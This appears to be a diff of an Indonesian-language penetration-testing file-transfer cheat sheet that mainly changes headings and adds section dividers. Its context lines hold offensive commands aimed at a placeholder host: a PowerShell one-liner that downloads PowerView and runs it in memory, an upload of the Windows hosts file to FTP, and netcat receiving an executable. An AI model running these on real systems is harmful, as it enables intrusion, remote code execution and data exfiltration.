@@ -1,8 +1,5 @@
----
-title: File Transfer CheatSheet
----
+# File Transfer
 
-<h1 align="center">File Transfer</h1>
 <h2 align="center">Windows</h2>
 
 ### Metode 1: Copy paste dari Linux
@@ -161,6 +158,8 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
   ```
   (New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
   ```
+
+---
 
 <h2 align="center">Linux</h2>
 
@@ -346,6 +345,8 @@ scp /path-file-yg-diupload username@10.129.86.90:/home/batagor/
   nc <ip> 443 > batagor.exe
   ncat <ip> 443 --recv-only > batagor.exe
   ```
+
+---
 
 <h2 align="center">Menghindari Deteksi</h2>
 
